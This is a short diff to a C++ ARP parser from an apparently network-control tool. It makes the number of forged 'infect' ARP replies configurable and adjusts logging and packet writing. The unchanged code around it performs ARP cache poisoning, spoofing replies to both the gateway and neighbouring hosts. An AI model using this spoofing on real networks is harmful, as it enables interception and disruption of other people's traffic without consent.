@@ -97,7 +97,6 @@ bool ARPParser::parse(WPacket& packet) //arp packet parsing
         return false;
     }
 
-    GTRACE("mac: %s, ip: %s", std::string(packet.ethHdr_->smac()).data(), std::string(packet.arpHdr_->sip()).data());
 
     if(((packet.arpHdr_->sip() & mask) == (gateway & mask) && packet.arpHdr_->sip() != gateway) || packet.ethHdr_->dmac().isBroadcast()) {
         g.mac_ = packet.ethHdr_->smac();//get mac
@@ -118,6 +117,11 @@ bool ARPParser::parse(WPacket& packet) //arp packet parsing
             fs.addHost(std::pair<WMac,Host>(g.mac_, g)); //insert into fs_map
         }
     }
+
+    if(packet.ethHdr_->smac() == packet.ethHdr_->dmac()) {
+        packet_instance.write(&packet);
+    }
+
     return true;
 }
 
@@ -141,18 +145,21 @@ void ARPParser::parse(WPacket& packet, std::map<WMac, Host> nb_map) {
             if(iter != nb_map.end()) {
                 GTRACE("have nb list");
                 WMac my_mac;
+
                 {
                     std::lock_guard<std::mutex> lock(packet_instance.m);
                     my_mac = packet_instance.intf()->mac();
                 }
+
                 // Infect gateway
                 arp_packet.makeArppacket(arp_packet.gate_mac, my_mac, arp_packet.gate_mac, arp_packet.gate_ip, packet.arpHdr_->tip());
                 arp_packet.packet.arp.op_ = htons(WArpHdr::Reply);
-                arp_packet.send(3);
+                arp_packet.send(nb.sendInfectNum);
+
                 // Infect Host
                 arp_packet.makeArppacket(g.mac_, my_mac, g.mac_, g.ip_, arp_packet.gate_ip);
                 arp_packet.packet.arp.op_ = htons(WArpHdr::Reply);
-                arp_packet.send(3);
+                arp_packet.send(nb.sendInfectNum);
             }
         }
     }
